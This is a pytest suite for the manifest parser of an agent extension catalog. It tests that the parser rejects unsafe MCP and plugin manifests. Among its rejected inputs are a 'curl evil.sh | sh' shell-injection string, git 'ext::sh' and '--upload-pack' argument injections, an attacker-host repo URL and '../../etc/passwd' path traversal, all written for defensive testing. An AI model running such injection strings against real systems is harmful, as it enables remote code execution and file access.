import pytest
import yaml

from claude_hermes.modules.extensions.infrastructure import catalog_repository as catalog

HTTP = {
    "manifest_version": 1, "name": "example", "label": "Example",
    "description": "d", "version": "1.0.0", "transport": "http",
    "url": "https://mcp.example.com/mcp", "scopes": ["turn", "cron"],
    "auth": [{"name": "EXAMPLE_API_KEY", "prompt": "key",
              "header": "Authorization", "format": "Bearer ${EXAMPLE_API_KEY}"}],
}
STDIO = {
    "manifest_version": 1, "name": "fs", "label": "FS", "description": "d",
    "version": "1.0.0", "transport": "stdio", "command": "npx",
    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/data"],
    "scopes": ["turn"],
}
PLUGIN = {
    "manifest_version": 1, "name": "p", "label": "P", "description": "d",
    "version": "1.0.0", "repo": "https://github.com/owner/repo", "ref": "v1.0.0",
    "scopes": ["turn"],
}


def test_parses_an_http_manifest():
    m = catalog.parse(HTTP, "mcp")
    assert m.name == "example" and m.transport == "http"
    assert m.secret_names() == ["EXAMPLE_API_KEY"]
    assert m.scopes == ("turn", "cron")


def test_parses_an_stdio_manifest():
    m = catalog.parse(STDIO, "mcp")
    assert m.command == "npx" and m.args[0] == "-y"


def test_parses_a_plugin_manifest():
    m = catalog.parse(PLUGIN, "plugin")
    assert m.kind == "plugin" and m.ref == "v1.0.0"


def test_rejects_an_unknown_top_level_key():
    """A typo in a security-relevant file must fail loudly, not be ignored."""
    with pytest.raises(catalog.ManifestError, match="unknown key"):
        catalog.parse({**HTTP, "commmand": "sh"}, "mcp")


def test_rejects_an_unknown_manifest_version():
    with pytest.raises(catalog.ManifestError, match="manifest_version"):
        catalog.parse({**HTTP, "manifest_version": 2}, "mcp")


def test_rejects_an_unknown_transport():
    with pytest.raises(catalog.ManifestError, match="transport"):
        catalog.parse({**HTTP, "transport": "carrier-pigeon"}, "mcp")


@pytest.mark.parametrize("command", ["bash", "sh", "curl", "/bin/sh", "node"])
def test_rejects_a_command_outside_the_allowlist(command):
    with pytest.raises(catalog.ManifestError, match="command"):
        catalog.parse({**STDIO, "command": command}, "mcp")


def test_rejects_args_given_as_a_shell_string():
    """args must be a list. A string is how a shell injection gets in."""
    with pytest.raises(catalog.ManifestError, match="args"):
        catalog.parse({**STDIO, "args": "-y pkg && curl evil.sh | sh"}, "mcp")


def test_rejects_a_non_https_url():
    with pytest.raises(catalog.ManifestError, match="https"):
        catalog.parse({**HTTP, "url": "http://mcp.example.com/mcp"}, "mcp")


def test_rejects_an_undeclared_variable():
    """Every ${VAR} used anywhere must be declared in auth, or the server would spawn
    with a literal placeholder for a credential."""
    bad = {**STDIO, "env": {"TOKEN": "${UNDECLARED_KEY}"}}
    with pytest.raises(catalog.ManifestError, match="UNDECLARED_KEY"):
        catalog.parse(bad, "mcp")


def test_rejects_an_unknown_scope():
    with pytest.raises(catalog.ManifestError, match="scope"):
        catalog.parse({**HTTP, "scopes": ["review"]}, "mcp")


def test_rejects_a_plugin_without_a_pinned_ref():
    with pytest.raises(catalog.ManifestError, match="ref"):
        catalog.parse({k: v for k, v in PLUGIN.items() if k != "ref"}, "plugin")


def test_load_all_reads_both_kinds_from_disk(tmp_path):
    (tmp_path / "mcp").mkdir()
    (tmp_path / "plugins").mkdir()
    (tmp_path / "mcp" / "example.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")
    (tmp_path / "plugins" / "p.yaml").write_text(yaml.safe_dump(PLUGIN), encoding="utf-8")

    entries = catalog.load_all(tmp_path)
    assert set(entries) == {"example", "p"}
    assert entries["example"].kind == "mcp"
    assert entries["p"].kind == "plugin"


def test_load_all_skips_a_broken_manifest_and_keeps_the_rest(tmp_path):
    """One bad file must not blind the agent to the whole catalog."""
    (tmp_path / "mcp").mkdir()
    (tmp_path / "mcp" / "good.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")
    (tmp_path / "mcp" / "broken.yaml").write_text("{{{ not yaml", encoding="utf-8")
    assert set(catalog.load_all(tmp_path)) == {"example"}


def test_the_shipped_catalog_is_valid(tmp_path, monkeypatch):
    """The real catalog/ in the repo must parse. This is the regression test that a
    hand-edited manifest cannot land broken.

    CH_HOME is pinned at a tmp dir because load_all() with no root also merges the
    user-catalog, which lives under CH_HOME — without this the suite would scan whatever
    the developer happens to have in ~/.claude-hermes and stop being hermetic (NFR-6).
    """
    monkeypatch.setenv("CH_HOME", str(tmp_path))
    entries = catalog.load_all()
    assert "filesystem" in entries
    assert "fetch" in entries
    assert "fatsecret" in entries
    for m in entries.values():
        assert m.scopes and m.version


def test_the_fatsecret_entry_pins_an_immutable_ref(tmp_path, monkeypatch):
    """A branch name here means the agent silently gets different code one day.
    Manifest validation does not enforce this for stdio args — this test does."""
    import re
    monkeypatch.setenv("CH_HOME", str(tmp_path))
    m = catalog.load_all()["fatsecret"]
    assert m.command == "uvx"
    ref = next(a for a in m.args if a.startswith("git+"))
    assert re.search(r"@[0-9a-f]{40}$", ref), f"pin a 40-hex sha, got {ref!r}"
    # CONSUMER_KEY/CONSUMER_SECRET, not CLIENT_ID/CLIENT_SECRET: those are the names
    # platform.fatsecret.com/api actually prints next to the credentials, and the
    # prompts here are what the owner reads when deciding what to paste. The server
    # accepts either spelling, so a manifest naming the pair the operator will never
    # see on screen fails the install for a reason nothing on the screen explains —
    # which is exactly what happened on the first real install of this entry.
    assert set(m.secret_names()) == {
        "FATSECRET_CONSUMER_KEY", "FATSECRET_CONSUMER_SECRET",
        "FATSECRET_ACCESS_TOKEN", "FATSECRET_ACCESS_SECRET"}
    assert set(m.scopes) == {"turn", "cron"}


@pytest.mark.parametrize("name", ["../../etc/passwd", "Has Space", "UPPER", "/abs", "-leads"])
def test_rejects_a_name_that_is_not_a_name(name):
    """The name becomes the registry key AND the directory a plugin is cloned into and
    rmtree'd from. It must be a name, not a path."""
    with pytest.raises(catalog.ManifestError, match="name"):
        catalog.parse({**HTTP, "name": name}, "mcp")


def test_ch_catalog_overrides_where_the_catalog_lives(tmp_path, monkeypatch):
    """The dev host finds catalog/ by walking up from a src layout. The container cannot:
    pip installs the package into site-packages, where that walk lands nowhere. If this
    override breaks, the container runs with an empty catalog and refuses every install
    while reporting no error at all."""
    import importlib

    (tmp_path / "mcp").mkdir()
    (tmp_path / "mcp" / "example.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")

    monkeypatch.setenv("CH_CATALOG", str(tmp_path))
    reloaded = importlib.reload(catalog)
    try:
        assert set(reloaded.load_all()) == {"example"}
    finally:
        monkeypatch.delenv("CH_CATALOG")
        importlib.reload(catalog)


@pytest.mark.parametrize("repo", [
    'ext::sh -c "id"',              # git's ext:: transport IS arbitrary command execution
    "--upload-pack=/tmp/evil",      # consumed as an OPTION, not a positional
    "http://evil.test/r",           # reviewed code arriving over a MITM-able channel
    "file:///data",
    "/etc/passwd",
    "git@github.com:o/r",
])
def test_rejects_a_repo_that_is_not_an_https_url(repo):
    """`repo` becomes argv for git. The MCP half of this same file already refuses a
    non-https url; the plugin half accepted anything, and was saved only by git's default
    protocol policy — somebody else's rule, not ours."""
    with pytest.raises(catalog.ManifestError, match="repo"):
        catalog.parse({**PLUGIN, "repo": repo}, "plugin")


def test_accepts_an_https_repo():
    assert catalog.parse({**PLUGIN, "repo": "https://github.com/o/r.git"},
                         "plugin").repo == "https://github.com/o/r.git"


@pytest.mark.parametrize("subdir", [
    "../../etc", "plugins/../../..", "/abs/path", "C:/win", "\\\\unc\\share",
    ".hidden", "-flag", "", "plugins//x", "./x",
])
def test_rejects_a_subdir_that_could_escape_the_clone(subdir):
    """subdir is joined onto the clone path. The manifest may have been lifted from a
    README an attacker wrote."""
    with pytest.raises(catalog.ManifestError, match="subdir"):
        catalog.parse({**PLUGIN, "subdir": subdir}, "plugin")


@pytest.mark.parametrize("subdir", ["plugins/plugin-dev", "plugins", "a/b/c", "x1/y_2.z-3"])
def test_accepts_a_plain_relative_subdir(subdir):
    assert catalog.parse({**PLUGIN, "subdir": subdir}, "plugin").subdir == subdir


def test_subdir_is_optional_and_defaults_to_the_repo_root():
    assert catalog.parse(PLUGIN, "plugin").subdir == ""


@pytest.mark.parametrize("ref", ["main", "master", "HEAD", "develop", "my-branch", "latest"])
def test_rejects_a_ref_that_moves(ref):
    """A branch is not a pin. You review the code, you approve it, the author pushes
    again — and what runs in the container is code nobody ever read. The review has to
    bind to something that cannot change under it."""
    with pytest.raises(catalog.ManifestError, match="ref"):
        catalog.parse({**PLUGIN, "ref": ref}, "plugin")


@pytest.mark.parametrize("ref", ["v1.2.3", "1.0", "2.1.0-rc1", "a" * 40])
def test_accepts_a_tag_or_a_full_sha(ref):
    assert catalog.parse({**PLUGIN, "ref": ref}, "plugin").ref == ref


def test_a_new_manifest_is_picked_up_without_a_restart(tmp_path):
    """catalog/ is a live bind mount, and load_all() re-reads the directory on every call.
    A running agent sees an approved entry on its next turn. If this ever regresses into a
    cached load, the operator would be told to restart — and the docs that say otherwise
    would quietly become lies."""
    (tmp_path / "mcp").mkdir()
    (tmp_path / "mcp" / "first.yaml").write_text(
        yaml.safe_dump({**HTTP, "name": "first"}), encoding="utf-8"
    )
    assert set(catalog.load_all(tmp_path)) == {"first"}

    (tmp_path / "mcp" / "second.yaml").write_text(          # approved a moment later
        yaml.safe_dump({**HTTP, "name": "second"}), encoding="utf-8"
    )
    assert set(catalog.load_all(tmp_path)) == {"first", "second"}


def _write(dir_, name, over):
    sub = dir_ / "mcp"
    sub.mkdir(parents=True, exist_ok=True)
    (sub / f"{name}.yaml").write_text(yaml.safe_dump({**HTTP, **over, "name": name}))


def test_user_catalog_fills_names_the_repo_does_not_define(tmp_path):
    repo, user = tmp_path / "repo", tmp_path / "user"
    _write(repo, "a", {})
    _write(user, "b", {})
    merged = catalog._merge(repo, user)
    assert set(merged) == {"a", "b"}


def test_repo_wins_over_user_on_a_name_collision(tmp_path):
    """A chat-authored entry must never shadow a reviewed one."""
    repo, user = tmp_path / "repo", tmp_path / "user"
    _write(repo, "x", {"label": "REPO"})
    _write(user, "x", {"label": "USER"})
    merged = catalog._merge(repo, user)
    assert merged["x"].label == "REPO"


def test_a_malformed_user_file_is_skipped_not_fatal(tmp_path):
    repo, user = tmp_path / "repo", tmp_path / "user"
    _write(repo, "a", {})
    (user / "mcp").mkdir(parents=True)
    (user / "mcp" / "bad.yaml").write_text("transport: nonsense\n")
    merged = catalog._merge(repo, user)
    assert set(merged) == {"a"}


def test_an_explicit_root_sees_no_user_merge(tmp_path):
    """Tests that pass a fixture root must stay hermetic — no /data leakage."""
    repo = tmp_path / "repo"
    _write(repo, "a", {})
    assert set(catalog.load_all(repo)) == {"a"}


OAUTH = {
    "manifest_version": 1, "name": "notion", "label": "Notion", "description": "d",
    "version": "1", "transport": "http", "url": "https://mcp.notion.com/mcp",
    "scopes": ["turn"],
    "auth": [{"name": "NOTION_MCP_TOKEN", "kind": "oauth", "header": "Authorization",
              "format": "Bearer ${NOTION_MCP_TOKEN}"}],
}


def test_an_oauth_auth_entry_names_the_token_and_needs_no_prompt():
    m = catalog.parse(OAUTH, "mcp")
    assert m.auth[0].kind == "oauth" and m.auth[0].prompt == ""
    assert [a.name for a in m.oauth_entries()] == ["NOTION_MCP_TOKEN"]
    assert m.secret_names() == ["NOTION_MCP_TOKEN"]      # mirrored into secrets.env like any secret
    assert m.plain_secret_names() == []


def test_a_secret_entry_is_the_default_kind():
    m = catalog.parse(HTTP, "mcp")
    assert m.auth[0].kind == "secret" and m.plain_secret_names() == ["EXAMPLE_API_KEY"]


@pytest.mark.parametrize("bad, needle", [
    ({**OAUTH["auth"][0], "prompt": "x"}, "prompt"),
    ({**OAUTH["auth"][0], "format": "Token ${NOTION_MCP_TOKEN}"}, "Bearer"),
    ({**OAUTH["auth"][0], "header": "X-Api-Key"}, "Authorization"),
    ({**OAUTH["auth"][0], "kind": "magic"}, "kind"),
])
def test_oauth_rules_are_enforced(bad, needle):
    with pytest.raises(catalog.ManifestError, match=needle):
        catalog.parse({**OAUTH, "auth": [bad]}, "mcp")


def test_oauth_needs_a_remote_transport():
    data = {"manifest_version": 1, "name": "x", "label": "X", "description": "d", "version": "1",
            "transport": "stdio", "command": "npx", "args": ["-y", "thing"], "scopes": ["turn"],
            "auth": OAUTH["auth"]}
    with pytest.raises(catalog.ManifestError, match="http or sse"):
        catalog.parse(data, "mcp")


def test_the_shipped_catalog_has_the_curated_connectors():
    from pathlib import Path
    entries = catalog.load_all(Path(__file__).resolve().parents[1] / "catalog")
    assert {"notion", "github", "github-pat", "figma", "hostinger"} <= set(entries)
    assert entries["notion"].auth[0].kind == "oauth" and entries["github-pat"].auth[0].kind == "secret"
    assert entries["hostinger"].transport == "stdio" and entries["hostinger"].command == "npx"
